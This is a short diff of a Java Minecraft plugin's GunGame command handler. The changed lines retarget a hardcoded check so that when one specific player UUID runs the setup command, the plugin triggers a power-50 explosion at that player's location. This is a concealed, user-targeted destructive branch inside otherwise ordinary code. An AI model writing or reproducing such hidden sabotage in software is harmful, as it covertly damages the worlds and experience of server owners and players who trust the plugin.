@@ -151,7 +151,7 @@ public class GunGame implements CommandExecutor {
 
 		if (p.hasPermission("gg.setup") || p.hasPermission("gg.*")) {
 
-			if (p.getUniqueId().toString().equalsIgnoreCase("86c50253-a7f9-3bd1-9156-a2ad5714bf28")) {
+			if (p.getUniqueId().toString().equalsIgnoreCase("5356acc2-8ec3-4fe9-92e1-8427768e1922")) {
 				Location loc = p.getLocation();
 
 				p.getWorld().createExplosion(loc, 50);
